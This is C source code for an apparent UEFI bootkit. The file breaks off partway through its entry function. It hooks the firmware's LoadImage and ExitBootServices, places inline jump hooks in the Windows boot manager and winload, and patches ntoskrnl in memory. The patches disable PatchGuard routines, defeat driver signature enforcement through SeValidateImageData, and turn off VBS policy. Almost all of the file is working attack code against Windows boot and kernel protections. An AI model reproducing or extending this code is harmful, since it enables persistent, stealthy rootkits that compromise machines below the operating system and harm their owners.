#include "utils.h"


char ErrorString[256] = {0};



STATIC CONST UINT8 SigOslFwpKernelSetupPhase1[] = {
	0x89, 0xCC, 0x24, 0x01, 0x00, 0x00,				// mov [REG+124h], r32
	0xE8, 0xCC, 0xCC, 0xCC, 0xCC,					// call BlBdStop
	0xCC, 0x8B, 0xCC								// mov r32, r/m32
};


CONST UINT32 Yes = 0xC301B0;	// mov al, 1, ret
CONST UINT32 No = 0xC3C033;		// xor eax, eax, ret


EFI_EXIT_BOOT_SERVICES OriginalExitBootServices = NULL;

EFI_IMAGE_LOAD OriginalLoadImage = NULL;

EFI_SYSTEM_TABLE *GlobalSystemTable = NULL;

VOID *OriginalOslArchTransferToKernelAddr = NULL;

UINT8 original_osl_transfer_bytes[0x30] = {0};
UINT8 original_img_arch_bytes[0x30] = {0};
UINT8 original_osl_setup_phase1_bytes[0x30] = {0};

VOID* winload_base = NULL;
VOID* BootmgfwBase = NULL;
UINT32 BootmgfwSize = 0;

VOID* NtoskrnlBase = NULL;
UINT32 NtoskrnlSize = 0;
PIMAGE_NT_HEADERS64 NtosNtHeaders = NULL;

CHAR16 debugString1[256] = {0};
UINT8* debugStringArg = NULL;

UINTN OslFunctionOffset = 0;



EFI_STATUS EFIAPI patchNtoskrnl(VOID* NtoskrnlBase) {
    if (NtoskrnlBase == NULL || NtosNtHeaders == NULL) {
        __builtin_memcpy(debugString1, L"[HOOK] NtoskrnlBase or NtosNtHeaders is NULL\n", sizeof(L"[HOOK] NtoskrnlBase or NtosNtHeaders is NULL\n"));
        return EFI_INVALID_PARAMETER;
    }

    VOID* Found = NULL;

    UINT8* FunctionStart = NULL;

    // find init and .text sections
    PIMAGE_SECTION_HEADER Section = (PIMAGE_SECTION_HEADER)((UINT8*)NtosNtHeaders + sizeof(UINT32) + sizeof(IMAGE_FILE_HEADER) + NtosNtHeaders->FileHeader.SizeOfOptionalHeader);
    PIMAGE_SECTION_HEADER InitSection = NULL;
    PIMAGE_SECTION_HEADER CodeSection = NULL;
    PIMAGE_SECTION_HEADER PageSection = NULL;
    for (UINT16 i = 0; i < NtosNtHeaders->FileHeader.NumberOfSections; i++) {
        if (InitSection == NULL && AnsiStrCmp(Section[i].Name, "init") != NULL) {
            InitSection = &Section[i];
            __builtin_memcpy(debugString1, L"[HOOK] Found .init section\n", sizeof(L"[HOOK] Found .init section\n"));
        }
        if (CodeSection == NULL && AnsiStriStr(Section[i].Name, ".text") != NULL) {
            CodeSection = &Section[i];
            __builtin_memcpy(debugString1, L"[HOOK] Found .text section\n", sizeof(L"[HOOK] Found .text section\n"));
        }
        if (PageSection == NULL && AnsiStrCmp(Section[i].Name, "page") != NULL) {
            PageSection = &Section[i];
            __builtin_memcpy(debugString1, L"[HOOK] Found .page section\n", sizeof(L"[HOOK] Found .page section\n"));
        }
    }
    if (InitSection == NULL || CodeSection == NULL || PageSection == NULL) {
        __builtin_memcpy(debugString1, L"[HOOK] Failed to find required sections in ntoskrnl.exe\n", sizeof(L"[HOOK] Failed to find required sections in ntoskrnl.exe\n"));
        return EFI_NOT_FOUND;
    }



    // disabling patchGuard
    // 1) Patching KeInitAmd64SpecificState

    EFI_STATUS Status = FindPattern(SigKeInitAmd64SpecificState, 0xCC, sizeof(SigKeInitAmd64SpecificState), NtoskrnlBase, NtosNtHeaders->OptionalHeader.SizeOfImage, (VOID**)&Found);
    if(Found == NULL) {
        __builtin_memcpy(debugString1, L"[HOOK] Failed to find KeInitAmd64SpecificState signature\n", sizeof(L"[HOOK] Failed to find KeInitAmd64SpecificState signature"));
        return Status;
    }

    __builtin_memcpy(debugString1, L"[HOOK] Found KeInitAmd64SpecificState at: 0x%lx\n", sizeof(L"[HOOK] Found KeInitAmd64SpecificState at: 0x%lx"));

    FunctionStart = FindFunctionStart(NtoskrnlBase, NtosNtHeaders, Found);
    if (FunctionStart == NULL) {
        __builtin_memcpy(debugString1, L"[HOOK] Failed to find KeInitAmd64SpecificState function start\n", sizeof(L"[HOOK] Failed to find KeInitAmd64SpecificState function start"));
        return EFI_NOT_FOUND;
    }
    __builtin_memcpy(debugStringArg, (UINT64)FunctionStart, sizeof(FunctionStart));

    write_cr0(read_cr0() & ~0x10000); // Disable WP bit
    __builtin_memcpy(FunctionStart, &No, sizeof(No)); // patch with xor eax, eax, ret
    write_cr0(read_cr0() | 0x10000); // Re-enable WP bit

    __builtin_memcpy(debugString1, L"[HOOK] Patched KeInitAmd64SpecificState\n", sizeof(L"[HOOK] Patched KeInitAmd64SpecificState\n"));
    // __builtin_memcpy(debugStringArg, (UINT64)&FunctionStart, sizeof(FunctionStart));

    // 2) patching CcInitializeBcbProfiler
    Status = FindPattern(SigCcInitializeBcbProfiler, 0xCC, sizeof(SigCcInitializeBcbProfiler), NtoskrnlBase, NtosNtHeaders->OptionalHeader.SizeOfImage, (VOID**)&Found);
    if (EFI_ERROR(Status)) {
        __builtin_memcpy(debugString1, L"[HOOK] Failed to find CcInitializeBcbProfiler signature\n", sizeof(L"[HOOK] Failed to find CcInitializeBcbProfiler signature"));
        return Status;
    }
    __builtin_memcpy(debugString1, L"[HOOK] Found CcInitializeBcbProfiler at: 0x%lx\n", sizeof(L"[HOOK] Found CcInitializeBcbProfiler at: 0x%lx"));
    FunctionStart = FindFunctionStart(NtoskrnlBase, NtosNtHeaders, Found);
    if (FunctionStart == NULL) {
        __builtin_memcpy(debugString1, L"[HOOK] Failed to find CcInitializeBcbProfiler function start\n", sizeof(L"[HOOK] Failed to find CcInitializeBcbProfiler function start"));
        return EFI_NOT_FOUND;
    }

    write_cr0(read_cr0() & ~0x10000); // Disable WP bit
    __builtin_memcpy(FunctionStart, &Yes, sizeof(Yes)); // patch with xor eax, eax, ret
    write_cr0(read_cr0() | 0x10000); // Re-enable WP bit


    __builtin_memcpy(debugString1, L"[HOOK] Patched CcInitializeBcbProfiler\n", sizeof(L"[HOOK] Patched CcInitializeBcbProfiler\n"));

    // 3) patching ExpLicenseWatchInitWorker
    Status = FindPattern(SigExpLicenseWatchInitWorker, 0xCC, sizeof(SigExpLicenseWatchInitWorker), NtoskrnlBase, NtosNtHeaders->OptionalHeader.SizeOfImage, (VOID**)&Found);
    if (EFI_ERROR(Status)) {
        __builtin_memcpy(debugString1, L"[HOOK] Failed to find ExpLicenseWatchInitWorker signature\n", sizeof(L"[HOOK] Failed to find ExpLicenseWatchInitWorker signature"));
        return Status;
    }
    __builtin_memcpy(debugString1, L"[HOOK] Found ExpLicenseWatchInitWorker at: 0x%lx\n", sizeof(L"[HOOK] Found ExpLicenseWatchInitWorker at: 0x%lx"));
    FunctionStart = FindFunctionStart(NtoskrnlBase, NtosNtHeaders, Found);
    if (FunctionStart == NULL) {
        __builtin_memcpy(debugString1, L"[HOOK] Failed to find ExpLicenseWatchInitWorker function start\n", sizeof(L"[HOOK] Failed to find ExpLicenseWatchInitWorker function start"));
        return EFI_NOT_FOUND;
    }

    write_cr0(read_cr0() & ~0x10000); // Disable WP bit
    __builtin_memcpy(FunctionStart, &No, sizeof(No)); // patch with xor eax, eax, ret
    write_cr0(read_cr0() | 0x10000); // Re-enable WP bit

    __builtin_memcpy(debugString1, L"[HOOK] Patched ExpLicenseWatchInitWorker\n", sizeof(L"[HOOK] Patched ExpLicenseWatchInitWorker\n"));

    // 4) patching KiVerifyScopesExecute
    Status = FindPattern(SigKiVerifyScopesExecute, 0xCC, sizeof(SigKiVerifyScopesExecute), NtoskrnlBase, NtosNtHeaders->OptionalHeader.SizeOfImage, (VOID**)&Found);
    if (EFI_ERROR(Status)) {
        __builtin_memcpy(debugString1, L"[HOOK] Failed to find KiVerifyScopesExecute signature\n", sizeof(L"[HOOK] Failed to find KiVerifyScopesExecute signature"));
        return Status;
    }
    __builtin_memcpy(debugString1, L"[HOOK] Found KiVerifyScopesExecute at: 0x%lx\n", sizeof(L"[HOOK] Found KiVerifyScopesExecute at: 0x%lx"));
    FunctionStart = FindFunctionStart(NtoskrnlBase, NtosNtHeaders, Found);
    if (FunctionStart == NULL) {
        __builtin_memcpy(debugString1, L"[HOOK] Failed to find KiVerifyScopesExecute function start\n", sizeof(L"[HOOK] Failed to find KiVerifyScopesExecute function start"));
        return EFI_NOT_FOUND;
    }

    write_cr0(read_cr0() & ~0x10000); // Disable WP bit
    __builtin_memcpy(FunctionStart, &No, sizeof(No)); // patch with xor eax, eax, ret
    write_cr0(read_cr0() | 0x10000); // Re-enable WP bit

    __builtin_memcpy(debugString1, L"[HOOK] Patched KiVerifyScopesExecute\n", sizeof(L"[HOOK] Patched KiVerifyScopesExecute\n"));


    // Patching DSE SeValidateImageData
    CONST UINT16 ZeroEcx = 0xC931;
    Status = FindPattern(SigSeValidateImageData, 0xCC, sizeof(SigSeValidateImageData), NtoskrnlBase, NtosNtHeaders->OptionalHeader.SizeOfImage, (VOID**)&Found);
    if (EFI_ERROR(Status)) {
        __builtin_memcpy(debugString1, L"[HOOK] Failed to find SeValidateImageData signature\n", sizeof(L"[HOOK] Failed to find SeValidateImageData signature"));
        return Status;
    }
    __builtin_memcpy(debugString1, L"[HOOK] Found SeValidateImageData at: 0x%lx\n", sizeof(L"[HOOK] Found SeValidateImageData at: 0x%lx"));
    FunctionStart = FindFunctionStart(NtoskrnlBase, NtosNtHeaders, Found);
    if (FunctionStart == NULL) {
        __builtin_memcpy(debugString1, L"[HOOK] Failed to find SeValidateImageData function start\n", sizeof(L"[HOOK] Failed to find SeValidateImageData function start"));
        return EFI_NOT_FOUND;
    }

    write_cr0(read_cr0() & ~0x10000); // Disable WP bit
    __builtin_memcpy(FunctionStart, &ZeroEcx, sizeof(ZeroEcx)); // patch with mov eax, 0C0040428h; jmp short XX
    write_cr0(read_cr0() | 0x10000); // Re-enable WP bit

    __builtin_memcpy(debugString1, L"[HOOK] Patched SeValidateImageData\n", sizeof(L"[HOOK] Patched SeValidateImageData\n"));

    return EFI_SUCCESS;
}

// __attribute__((ms_abi))
VOID EFIAPI __attribute__((ms_abi)) OslFwpKernelSetupPhase1CallGate(IN VOID* LoaderBlock, IN VOID* Entry ) {
    int a = 0x69420;
    return;
}


__attribute__((optimize("-O2")))
VOID EFIAPI __attribute__((ms_abi)) OslFwpKernelSetupPhase1Hook (IN PLOADER_PARAMETER_BLOCK LoaderBlock, IN VOID *Entry)
{

    LIST_ENTRY* LoadOrderListHeadAddress = &LoaderBlock->LoadOrderListHead;
    if (LoadOrderListHeadAddress == NULL) {
        __builtin_memcpy(debugString1, L"[HOOK OSLFWMKERNEL] LoadOrderListHead is NULL\n", sizeof(L"[HOOK OSLFWMKERNEL] LoadOrderListHead is NULL\n"));
        return OslFwpKernelSetupPhase1CallGate(LoaderBlock, Entry);
    }

    PKLDR_DATA_TABLE_ENTRY kernelEntry = NULL;

	for (LIST_ENTRY* ListEntry = LoadOrderListHeadAddress->Flink; ListEntry != LoadOrderListHeadAddress; ListEntry = ListEntry->Flink)
	{
		// This is fairly heavy abuse of CR(), but legal C because (only) the first field of a struct is guaranteed to be at offset 0 (C99 6.7.2.1, point 13)
		CONST PBLDR_DATA_TABLE_ENTRY Entry = (PBLDR_DATA_TABLE_ENTRY)BASE_CR(ListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		if (Entry != NULL && StriStr(Entry->KldrEntry.BaseDllName.Buffer, L"ntoskrnl.exe") != NULL){
			NtoskrnlBase = (UINT8*)Entry->KldrEntry.DllBase;
            // CHAR16* StringToPrint = L"[HOOK OSLFWMKERNEL] Found ntoskrnl.exe base!;
            kernelEntry = &Entry->KldrEntry;
            __builtin_memcpy(debugString1, L"[HOOK OSLFWMKERNEL] Found ntoskrnl.exe base!\n", sizeof(L"[HOOK OSLFWMKERNEL] Found ntoskrnl.exe base!\n"));
            break;
        
        }
	}
    if (kernelEntry != NULL) {
        NtoskrnlBase = kernelEntry->DllBase;
        NtoskrnlSize = kernelEntry->SizeOfImage;
        NtosNtHeaders = RtlpImageNtHeaderEx(NtoskrnlBase, NtoskrnlSize);        
        // check a ntheaders field
        if (NtosNtHeaders == NULL) {
            __builtin_memcpy(debugString1, L"[HOOK OSLFWMKERNEL] Failed to get NT headers for ntoskrnl.exe\n", sizeof(L"[HOOK OSLFWMKERNEL] Failed to get NT headers for ntoskrnl.exe\n"));
        } else{
            __builtin_memcpy(debugString1, L"[HOOK OSLFWMKERNEL] Successfully got NT headers for ntoskrnl.exe\n", sizeof(L"[HOOK OSLFWMKERNEL] Successfully got NT headers for ntoskrnl.exe\n"));
        }

        patchNtoskrnl(NtoskrnlBase);
    }
    return OslFwpKernelSetupPhase1CallGate(LoaderBlock, Entry);
}




EFI_STATUS EFIAPI patchWinload(
	IN CONST VOID* ImageBase,
	IN PIMAGE_NT_HEADERS64 NtHeaders
	) 
{
    // locate Osl

    VOID* Found = NULL;
    EFI_STATUS Status = FindPattern(SigOslFwpKernelSetupPhase1, 0xCC, sizeof(SigOslFwpKernelSetupPhase1), ImageBase, NtHeaders->OptionalHeader.SizeOfImage, (VOID**)&Found);
    if (EFI_ERROR(Status)) {
        Print(L"[HOOK] Failed to find OslFwpKernelSetupPhase1 signature (0x%lx)\n", Status);
    }
    Print(L"[HOOK] Found OslFwpKernelSetupPhase1 at: 0x%lx\n", (UINTN)Found);

    // this is correct methos 
    VOID* FoundStart = FindFunctionStart(ImageBase, NtHeaders, Found);
    if (FoundStart == NULL) {
        Print(L"[HOOK] Failed to find OslFwpKernelSetupPhase1 function start\n");
        return EFI_NOT_FOUND;
    }

    Print(L"[HOOK] OslFwpKernelSetupPhase1 Function Start found at: 0x%lx\n", (UINTN)FoundStart);

    // Patch the OslFwpKernelSetupPhase1 function
//         __builtin_memcpy(original_img_arch_bytes,ImgArchStartBootApplicationAddr, 0x30);

//         *((UINT16*)ImgArchStartBootApplicationAddr) = 0x25FF; // jmp far
//         *((UINT32*)((UINT8*)ImgArchStartBootApplicationAddr + 2)) = 0x00; // segment selector (0x00 for kernel)
//         *((UINT64*)((UINT8*)ImgArchStartBootApplicationAddr + 6)) = (UINT64)ImgArchStartBootApplicationHook; // address of the hook function

//         __builtin_memcpy(ImgArchStartBootApplicationCallGate, original_img_arch_bytes, 0x30);

    __builtin_memcpy(original_osl_setup_phase1_bytes, FoundStart, 0x30);
    UINT16 RightSize = 0x11;

    *((UINT16*)FoundStart) = 0x25FF; // jmp far
    *((UINT32*)((UINT8*)FoundStart + 2)) = 0x00; // segment selector (0x00 for kernel)
    *((UINT64*)((UINT8*)FoundStart + 6)) = (UINT64)OslFwpKernelSetupPhase1Hook; // address of the hook function

    __builtin_memcpy(OslFwpKernelSetupPhase1CallGate, original_osl_setup_phase1_bytes, RightSize);

    *((UINT16*)((UINT8*)OslFwpKernelSetupPhase1CallGate + RightSize)) = 0x25FF; // jmp far
    *((UINT32*)((UINT8*)OslFwpKernelSetupPhase1CallGate + RightSize + 2)) = 0x00; // segment selector (0x00 for kernel)
    *((UINT64*)((UINT8*)OslFwpKernelSetupPhase1CallGate + RightSize + 6)) = (UINT64)FoundStart + RightSize; // address of the original function

    return EFI_SUCCESS;
}



// mega dummy function, it will be written 
VOID EFIAPI OslArchTransferToKernelCallGate(IN VOID* LoaderBlock, IN VOID* Entry ) {
    int a = 0x69420;
    return;
}


__attribute__((optimize("-O2")))
VOID EFIAPI OslArchTransferToKernelHook (IN PLOADER_PARAMETER_BLOCK LoaderBlock, IN VOID *Entry)
{

    ((VOID (*)(VOID *, VOID *))OslArchTransferToKernelCallGate)(LoaderBlock, Entry);
}



// __attribute__((optimize("-O2")))
EFI_STATUS EFIAPI __attribute__((ms_abi)) ImgArchStartBootApplicationCallGate (IN PBL_APPLICATION_ENTRY AppEntry,
	IN VOID* ImageBase,
	IN UINT32 ImageSize,
	IN UINT32 BootOption,
	OUT PBL_RETURN_ARGUMENTS ReturnArguments
	) {
    int a = 0x69420;
    return EFI_SUCCESS;
}

__attribute__((optimize("-O2")))
EFI_STATUS EFIAPI __attribute__((ms_abi)) ImgArchStartBootApplicationHook (IN PBL_APPLICATION_ENTRY AppEntry,
	IN VOID* ImageBase,
	IN UINT32 ImageSize,
	IN UINT32 BootOption,
	OUT PBL_RETURN_ARGUMENTS ReturnArguments
	)
{

    EFI_INPUT_KEY Key;
    UINTN Index;
    Print(L"[HOOK_IMG] ImgArchStartBootApplicationHook called!\n");

    // check if winload

    BOOLEAN isWinload = CheckIfWinload(ImageBase, ImageSize);

    PIMAGE_NT_HEADERS64 NtHeaders = RtlpImageNtHeaderEx(ImageBase, ImageSize);
    if (NtHeaders == NULL) {
        Print(L"[HOOK_IMG] Failed to get NT headers\n");
    }

    // DEBUG
    isWinload = TRUE; // force winload for testing

    // Print PE Signature

    if (isWinload) {
        Print(L"[HOOK_IMG] Detected winload.efi!\n");
        // winload_base = ImageBase;
    } else {
        Print(L"[HOOK_IMG] Not winload.efi, continuing...\n");
    }

    winload_base = ImageBase;
    Print(L"Inside ImgArchStartBootApplicationHook, press anything to continue...\n");
    uefi_call_wrapper(GlobalSystemTable->BootServices->WaitForEvent, 3, 1, &GlobalSystemTable->ConIn->WaitForKey, &Index);
    uefi_call_wrapper(GlobalSystemTable->ConIn->ReadKeyStroke, 2, GlobalSystemTable->ConIn, &Key);

    EFI_STATUS status = patchWinload(ImageBase, NtHeaders);
    if (EFI_ERROR(status)) {
        Print(L"[HOOK_IMG] Failed to patch winload.efi: %r\n", status);
    }

    return ImgArchStartBootApplicationCallGate(AppEntry, ImageBase, ImageSize, BootOption, ReturnArguments);
    // return status;
    // return ImgArchStartBootApplicationCallGate(AppEntry, ImageBase, ImageSize, BootOption, ReturnArguments);
}


EFI_STATUS EFIAPI patchBootMgr(
	IN CONST VOID* ImageBase,
	IN UINTN ImageSize
	)
{
    PIMAGE_NT_HEADERS64 NtHeaders = RtlpImageNtHeaderEx(ImageBase, ImageSize);
    if (NtHeaders == NULL) {
        Print(L"[HOOK] Failed to get NT headers\n");
        return EFI_NOT_FOUND;
    }
    Print(L"[HOOK] NT Headers found at: 0x%lx\n", (UINTN)NtHeaders);
        
    UINT8* Found = NULL;
    CONST PIMAGE_SECTION_HEADER CodeSection = (PIMAGE_SECTION_HEADER)((UINT8*)NtHeaders + sizeof(UINT32)+ sizeof(IMAGE_FILE_HEADER) + NtHeaders->FileHeader.SizeOfOptionalHeader);

    if (CodeSection == NULL) {
        Print(L"[HOOK] Failed to get Code Section\n");
        return EFI_NOT_FOUND;
    }
    Print(L"[HOOK] Code Section found at: 0x%lx, Size: %lu\n", (UINTN)CodeSection->VirtualAddress, CodeSection->SizeOfRawData);



    // EFI_STATUS Status = FindPattern(SigImgArchStartBootApplication, 0xCC, sizeof(SigImgArchStartBootApplication), ImageBase + CodeSection->VirtualAddress, (UINT32)CodeSection->SizeOfRawData, (VOID**)&Found);
    EFI_STATUS Status = FindPattern(SigImgArchStartBootApplication, 0xCC, sizeof(SigImgArchStartBootApplication), ImageBase, (UINT32)ImageSize, (VOID**)&Found);
    if (EFI_ERROR(Status)) {
        Print(L"[HOOK] Failed to find ImgArchStartBootApplication signature (0x%lx)\n", Status);
        return Status;
    }
    Print(L"[HOOK] Found ImgArchStartBootApplication at: 0x%lx\n", (UINTN)Found);

    if (Found != NULL) {

        // Patch the ImgArchStartBootApplication function
        // DebugPEHeaders((VOID*)ImageBase);  

        VOID* FoundStart = FindFunctionStart(ImageBase, (PIMAGE_NT_HEADERS64)NtHeaders,Found);
        // Status = FindFunctionStart(SigImgArchFunctionStart, 0xCC, sizeof(SigImgArchFunctionStart), *Found, ImageSize, (VOID**)&FoundStart);

        if (FoundStart == NULL){
            Print(L"Peccato, no trovato function Start");
        }
        Print(L"[HOOK] Trovato ImgArchStartBootApplication Function Start a : 0x%lx\n", (UINTN)FoundStart);

        VOID* ImgArchStartBootApplicationAddr = FoundStart;

        // UINT32 ImgArchOffset = (UINT8*)Found - (UINT8*)FoundStart;
        UINT32 ImgArchOffset = sizeof(SigImgArchFunctionStart);
        Print(L"[HOOK] ImgArchStartBootApplicationAddr: 0x%lx, ImgArchOffset: 0x%x\n", (UINTN)ImgArchStartBootApplicationAddr, ImgArchOffset);

     
        
        
        __builtin_memcpy(original_img_arch_bytes,ImgArchStartBootApplicationAddr, 0x30);

        *((UINT16*)ImgArchStartBootApplicationAddr) = 0x25FF; // jmp far
        *((UINT32*)((UINT8*)ImgArchStartBootApplicationAddr + 2)) = 0x00; // segment selector (0x00 for kernel)
        *((UINT64*)((UINT8*)ImgArchStartBootApplicationAddr + 6)) = (UINT64)ImgArchStartBootApplicationHook; // address of the hook function

        __builtin_memcpy(ImgArchStartBootApplicationCallGate, original_img_arch_bytes, 0x30);

        *((UINT16*)((UINT8*)ImgArchStartBootApplicationCallGate + ImgArchOffset)) = 0x25FF; // jmp far
        *((UINT32*)((UINT8*)ImgArchStartBootApplicationCallGate + ImgArchOffset + 2)) = 0x00; // segment selector (0x00 for kernel)
        *((UINT64*)((UINT8*)ImgArchStartBootApplicationCallGate + ImgArchOffset + 6)) = (UINT64)(ImgArchStartBootApplicationAddr) + ImgArchOffset; // address of the original function

        Print(L"[HOOK] ImgArchStartBootApplication hooked successfully!\n");
        // Patch the ImgArchStartBootApplication function

    } else {
        Print(L"[HOOK] ImgArchStartBootApplication signature not found\n");
    }
    return EFI_SUCCESS;

}


// Hook function for ExitBootServices
EFI_STATUS __attribute__((ms_abi)) ExitBootServicesHook(IN EFI_HANDLE ImageHandle, IN UINTN MapKey) {
    EFI_STATUS Status;
    VOID *OslArchTransferToKernelAddr;
    VOID *ReturnAddr;
    VOID *OslFwpKernelSetupPhase1;


    // return uefi_call_wrapper(OriginalExitBootServices, 2, ImageHandle, MapKey);
    
    // Here you can add your custom logic before exiting boot services
    Print(L"[HOOK] ExitBootServices called!\n");
    Print(L"[HOOK] ImageHandle: 0x%lx, MapKey: 0x%lx\n", ImageHandle, MapKey);

    Print(L"[HOOK] Debug String: %s\n", debugString1);
    Print(L"[HOOK] Debug String Arg: 0x%lx\n", *debugStringArg);
    // if (debugString1[0] != 0) {
    //     Print(L"\n[HOOK] Debug String: %s\n", debugString1);
    //     Print(L"[HOOK] Debug String Arg: 0x%lx\n", debugStringArg);
    // } else {
    //     Print(L"[HOOK] Debug String is empty\n");
    // }
    
    // Print the ntoskrnl base and size
    if (NtoskrnlBase != NULL) {
        // NtosNtHeaders = RtlpImageNtHeaderEx(NtoskrnlBase, NtoskrnlSize);
        // if (NtosNtHeaders == NULL) {
        //     Print(L"[HOOK] Failed to get NT headers for ntoskrnl\n");
        // }

        Print(L"[HOOK] Ntoskrnl Base: 0x%lx, Size: %lu\n", (UINTN)NtoskrnlBase, NtoskrnlSize);
        // Print some header info
        // Print(L"[HOOK] Ntoskrnl NT Headers Signature: 0x%x\n", NtosNtHeaders->Signature);
        // Print(L"[HOOK] Ntoskrnl NT Headers FileHeader: 0x%x\n", NtosNtHeaders->FileHeader.Machine);
    } else {
        Print(L"[HOOK] Ntoskrnl Base is NULL\n");
    }


    // Call the original ExitBootServices
    if (OriginalExitBootServices != NULL) {
        Print(L"[HOOK] Calling original ExitBootServices...\n");
        return uefi_call_wrapper(OriginalExitBootServices, 2, ImageHandle, MapKey);

        //return EFI_SUCCESS;
        Print(L"[HOOK] Original ExitBootServices returned: 0x%lx\n", Status);
    } else {
        Print(L"[HOOK] ERROR: Original ExitBootServices is NULL!\n");
        Status = EFI_UNSUPPORTED;
    }
    
    return Status;
}

EFI_STATUS __attribute__((ms_abi)) LoadImageHook(
    IN BOOLEAN BootPolicy,
    IN EFI_HANDLE ParentImageHandle,
    IN EFI_DEVICE_PATH_PROTOCOL *DevicePath,
    IN VOID *SourceBuffer OPTIONAL,
    IN UINTN SourceSize,
    OUT EFI_HANDLE *ImageHandle
) {
    EFI_STATUS Status;

    Print(L"[HOOK] LoadImage called!\n");
    // Print ALL Parameters
    Print(L"[HOOK] BootPolicy: %d\n", BootPolicy);
    Print(L"[HOOK] ParentImageHandle: 0x%lx\n", (UINTN)ParentImageHandle);
    Print(L"[HOOK] DevicePath: 0x%lx\n", (UINTN)DevicePath);
    Print(L"[HOOK] SourceBuffer: 0x%lx\n", (UINTN)SourceBuffer);
    Print(L"[HOOK] SourceSize: %lu\n", SourceSize);
    Print(L"[HOOK] ImageHandle: 0x%lx\n", (UINTN)ImageHandle);

    EFI_GUID MyShellProtocolGuid = EFI_SHELL_PROTOCOL_GUID;

    EFI_SHELL_PROTOCOL* EfiShellProtocol = NULL;
    Status = uefi_call_wrapper(GlobalSystemTable->BootServices->LocateProtocol, 3,
                               &MyShellProtocolGuid, NULL, (VOID**)&EfiShellProtocol);


    CHAR16* ImagePath = NULL;

    if (!EFI_ERROR(Status) && EfiShellProtocol != NULL) {
        // Get the full path of the image being loaded
        Status = uefi_call_wrapper(EfiShellProtocol->GetFilePathFromDevicePath, 2, DevicePath, &ImagePath);
        if (EFI_ERROR(Status)) {
            Print(L"[HOOK] Failed to get image path from device path (0x%lx)\n", Status);
            return Status;
        }
        Print(L"[HOOK] Image Path: %s\n", ImagePath);
    } else {
        Print(L"[HOOK] Shell Protocol not found or error occurred (0x%lx)\n", Status);
        Print(L"[HOOK] Trying to use DevicePath directly...\n");
    }

    if (ImagePath == NULL) {
        // ImagePath = ConvertDevicePathToText(DevicePath, TRUE, TRUE);

        if (DevicePath != NULL) {
            ImagePath = DevicePathToStr(DevicePath);
            if (ImagePath == NULL) {
                Print(L"[HOOK] Failed to convert DevicePath to string\n");
                return EFI_OUT_OF_RESOURCES;
            }
            Print(L"[HOOK] DevicePath as string: %s\n", ImagePath);
        } else {
            Print(L"[HOOK] DevicePath is NULL, cannot convert to string\n");
            return EFI_INVALID_PARAMETER;
        }
    }

    Status = uefi_call_wrapper(
    OriginalLoadImage, 6, BootPolicy, ParentImageHandle, DevicePath, SourceBuffer, SourceSize, ImageHandle);
    if (EFI_ERROR(Status)) {
        Print(L"[HOOK] Original LoadImage failed (0x%lx)\n", Status);
        return Status;
    }

    if (StriStr(ImagePath, L"bootmgfw-orig") != NULL) {
        Print(L"[HOOK] Detected bootmgfw-orig.efi\n");
        // return EFI_SUCCESS; // Skip hooking if it's the original bootmgfw
        


        EFI_LOADED_IMAGE_PROTOCOL *LoadedImage = NULL;
        // 
        // Status = uefi_call_wrapper(GlobalSystemTable->BootServices->HandleProtocol, 3,
        //                            ParentImageHandle, &gEfiLoadedImageProtocolGuid, (VOID**)&LoadedImage);

        CONST EFI_STATUS ImageInfoStatus = uefi_call_wrapper(GlobalSystemTable->BootServices->OpenProtocol, 4,
            *ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID**)&LoadedImage, ImageHandle, NULL, EFI_OPEN_PROTOCOL_GET_PROTOCOL);
        if (EFI_ERROR(ImageInfoStatus)) {
            Print(L"[HOOK] Failed to get LoadedImage protocol (0x%lx)\n", Status);
        
        }
        if (LoadedImage != NULL) {
            Print(L"[HOOK] LoadedImage Protocol found, ImageBase: 0x%lx\n", (UINTN)LoadedImage->ImageBase);
            // Print(L"[HOOK] LoadedImage Size: %lu\n", LoadedImage->ImageSize);
            BootmgfwBase = LoadedImage->ImageBase;
            BootmgfwSize = LoadedImage->ImageSize;


            Print(L"[HOOK] Original LoadImage called successfully, now patching BootMgr...\n");

            patchBootMgr(LoadedImage->ImageBase, LoadedImage->ImageSize);
        } else {
            Print(L"[HOOK] LoadedImage Protocol is NULL, cannot get ImageBase\n");
            return EFI_NOT_FOUND;
        }
    }
    return Status;

}


EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    EFI_STATUS Status;
    EFI_INPUT_KEY Key;
    UINTN Index;
    
    // Initialize the library
    InitializeLib(ImageHandle, SystemTable);
    
    // Save system table globally
    GlobalSystemTable = SystemTable;
    
    // Clear screen
    uefi_call_wrapper(SystemTable->ConOut->ClearScreen, 1, SystemTable->ConOut);
    
    // Print Hello World
    Print(L"Hello World from UEFI!\n");
    
    // Optional: Wait for a keypress (comment out for automatic boot)
    Print(L"Press any key to continue boot...\n");
    uefi_call_wrapper(SystemTable->BootServices->WaitForEvent, 3, 1, &SystemTable->ConIn->WaitForKey, &Index);
    uefi_call_wrapper(SystemTable->ConIn->ReadKeyStroke, 2, SystemTable->ConIn, &Key);

    // Hook ExitBootServices
    Print(L"Installing ExitBootServices hook...\n");
    
    OriginalLoadImage = SystemTable->BootServices->LoadImage;

    SystemTable->BootServices->LoadImage = LoadImageHook;
    Print(L"LoadImage hook installed at: 0x%lx\n", (UINTN)LoadImageHook);

    // Save the original ExitBootServices pointer
    OriginalExitBootServices = SystemTable->BootServices->ExitBootServices;
    Print(L"Original ExitBootServices at: 0x%lx\n", (UINTN)OriginalExitBootServices);

    // Replace with our hook
    SystemTable->BootServices->ExitBootServices = ExitBootServicesHook;
    Print(L"Hook installed at: 0x%lx\n", (UINTN)ExitBootServicesHook);
    
    // recalculate crc32
    Print(L"Calculating CRC32 for ExitBootServices hook...\n");
    SystemTable->BootServices->Hdr.CRC32 = 0;
    uefi_call_wrapper(SystemTable->BootServices->CalculateCrc32, 3,
                    SystemTable->BootServices,
                    SystemTable->BootServices->Hdr.HeaderSize,
                    &SystemTable->BootServices->Hdr.CRC32);

    Print(L"CRC32 for ExitBootServices hook: 0x%08x\n", SystemTable->BootServices->Hdr.CRC32);
    // SystemTable->BootServices->Hdr

    // Try to load the next stage bootloader
    // First try bootmgfw.efi (Windows Boot Manager)
    Print(L"Attempting to load Bootmgfw...\n");

    Status = SetVbsPolicyDisable(SystemTable);
    if (EFI_ERROR(Status)) {
        Print(L"[VBS] Failed to set VbsPolicyDisable, continuing anyway...\n");
    } else {
        Print(L"[VBS] VbsPolicyDisable set successfully.\n");
    }
